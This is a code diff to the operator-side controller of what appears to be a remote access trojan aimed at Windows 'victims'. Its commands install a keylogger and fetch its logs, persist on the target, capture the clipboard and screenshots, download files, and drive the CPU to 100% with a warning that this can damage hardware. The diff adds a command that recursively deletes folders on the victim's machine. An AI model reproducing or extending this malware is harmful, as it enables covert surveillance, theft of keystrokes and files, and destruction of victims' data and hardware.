@@ -24,7 +24,7 @@ session_ids = []
 COMMANDS = ["help", "sessions"]
 SESSION_COMMANDS = ["help", "back", "tree", "install", "matrix", "disconnect", "ps", "kill", "keylogger", "getlogs",
                     "keybind", "msg", "statlights", "delete", "uninstall", "ls", "whoami", "clipboard", "download",
-                    "screenshot", "cpu", "kermit", "url"]
+                    "screenshot", "cpu", "kermit", "url", "rmdir"]
 
 
 class Commands:
@@ -51,9 +51,11 @@ class Commands:
             msg: [your message] opens notepad and writes the given message (t)
             statlights: [number of blinks] makes the Caps-, Num- and Scrolllock lights blink (t)
             delete: [absolute path to file] deletes the given file (t)
+            rmdir: [absolute path to folder] deletes given folder (t)
             cpu: [secconds for how long the cpu will got to 100%] makes the cpu got to 100%(this can break the computer if the cpu runs too hot) (t)
             kermit: just dont ask (t)
             url: [url] open the given url in the default browser (t)
+            background: [absolute path to image] changes the background
         Spionage:
             Keylogger: Installs a keylogger, retreive the logs with getlogs (p)
             ps: shows all running processes (t)
@@ -151,24 +153,24 @@ class Commands:
                 return returned
             else:
                 return
-
+# ________________________________________________________________________________________________
         # gets you back to the main menu
         if message == "back":
             mainMenu()
-
+# ________________________________________________________________________________________________
         # prints the help message
         elif message == "help":
             print(self.helpmsg)
-
+# ________________________________________________________________________________________________
         # shows the entire dir tree
         elif message == "tree":
             print(sendMessage("c o tree C:\\"))
-
+# ________________________________________________________________________________________________
         # installs the shell persistently
         elif message == "install":
             with open("extraScripts/plain.py", "r") as file:
                 sendMessage(f"x{file.read()}")
-
+# ________________________________________________________________________________________________
         # is a small bat script which makes random number appear in a cmd screen
         elif message == "matrix":
             if args:
@@ -191,9 +193,11 @@ class Commands:
                 print("you need an argument type 'help' for more")
             else:
                 print("Those are too many arguments only one is allowed type 'help' for more.")
+# ________________________________________________________________________________________________
         # shows all tasks with pid
         elif message == "ps":
             print(sendMessage("c o tasklist"))
+# ________________________________________________________________________________________________
         # kills task with given pid
         elif message == "kill":
             # taskkill /im
@@ -213,6 +217,7 @@ class Commands:
                 sendMessage(file.read())
             if receiveMessage() == "err":
                 print("You need to install the shell")
+# ________________________________________________________________________________________________
         # gets the keylogger logs
         elif message == "getlogs":
             sendMessage("r C:/$SysStartup/temp/logs.txt")
@@ -227,6 +232,7 @@ class Commands:
                         return
             else:
                 print("Either wait for a logfile or install the keylogger.")
+# ________________________________________________________________________________________________
         # deletes a file in given path
         elif message == "delete":
             if args:
@@ -236,7 +242,7 @@ class Commands:
                 print("You need a path type 'help' for more")
             else:
                 print("to many arguments type 'help' for more")
-
+# ________________________________________________________________________________________________
         # uninstalls the whole shell
         elif message == "uninstall":
             user = sendMessage("c o echo %USERNAME%").strip()
@@ -247,7 +253,7 @@ class Commands:
             sendMessage("!dsc")
             conn.close()
             delete()
-
+# ________________________________________________________________________________________________
         # sends a keybind
         elif message == "keybind":
             special_keys = {"ctrl": "Key.ctrl", "windows": "Key.cmd", "alt": "Key.alt_l", "alt_gr": "Key.alt_gr",
@@ -276,6 +282,7 @@ class Commands:
                 print("You need to type the keybinds type 'help' for more.")
             else:
                 print("Those are to many arguments type 'help' for more.")
+# ________________________________________________________________________________________________
         # types a message into notepad
         elif message == "msg":
             if args:
@@ -286,6 +293,7 @@ class Commands:
                 sendMessage(f"k t {msg}")
             else:
                 print("You need atleast one letter for the message type 'help' for more")
+# ________________________________________________________________________________________________
         # makes the keyboard status lights blink randomly
         elif message == "statlights":
             if args:
@@ -298,7 +306,7 @@ class Commands:
                 print("You need to write how many times to let the lights blink type 'help' for more")
             else:
                 print("Too many arguments type 'help' for more")
-
+# ________________________________________________________________________________________________
         # shows the contents of a folder
         elif message == "ls":
             if args:
@@ -319,6 +327,7 @@ class Commands:
 
             elif not args:
                 print("You need specify a path type 'help' for more")
+# ________________________________________________________________________________________________
         # basic whoami command
         elif message == "whoami":
             print(sendMessage("c o whoami"))
@@ -326,6 +335,7 @@ class Commands:
         # shows whats currently in the clipboard
         elif message == "clipboard":
             print(sendMessage("c o powershell Get-Clipboard"))
+# ________________________________________________________________________________________________
         # downloads a file from given path
         elif message == "download":
             if args:
@@ -352,6 +362,7 @@ class Commands:
                 print("You need to specify a path")
             else:
                 print("Too many argument type 'help' for more")
+# ________________________________________________________________________________________________
         # takes a screenshot
         elif message == "screenshot":
             usersName = sendMessage("c o echo %USERNAME%").strip()
@@ -373,6 +384,7 @@ class Commands:
                 else:
                     sendMessage("c n del /f /Q C:\\Users\\Public\\monitor-1.png")
                     return
+# ________________________________________________________________________________________________
         # makes the cpu go to 100%
         elif message == "cpu":
             if len(args) == 1:
@@ -402,6 +414,8 @@ class Commands:
                 print("You need to specify an argument type 'help' for more")
             else:
                 print("Too many arguments type 'help' for more")
+#________________________________________________________________________________________________
+        # dont ask
         elif message == "kermit":
             # gets the username for execution of the sendet scripts
             username = sendMessage("c o echo %USERNAME%").strip()
@@ -439,6 +453,7 @@ class Commands:
                 for cmds in range(0, 10):
                     sendMessage(f"c n start cmd /c C:/Users/{username}/AppData/Local/Temp/{cmdname}")
                     sleep(0.1)
+        # open a url in default browser
         elif message == "url":
             if len(args) == 1:
                 sendMessage(f"c n start {args[0]}")
@@ -446,6 +461,27 @@ class Commands:
                 print("You need to specify an url")
             else:
                 print("Too many arguments type 'help' for more")
+        # removes a dirrectoriy
+        elif message == "rmdir":
+            if len(args) == 1:
+                path = args[0].replace("/", "\\")
+                if " " in path:
+                    sendMessage(f'c n rmdir "{path}" /s /q')
+                else:
+                    sendMessage(f"c n rmdir {path} /s /q")
+            elif not args:
+                print("You need to specify a path type 'help' for mora")
+            else:
+                print("Only one argument is allowed type 'help' for more")
+# ________________________________________________________________________________________________
+        # change the background
+        if message == "background":
+            if len(args) == "1":
+                pass
+            elif not args:
+                pass
+            else:
+                pass
         # disconnects and closes the shell script on the victims pc(if installed it will reconnect after restart of the victims pc)
         elif message == "disconnect":
             sendMessage("!dsc")
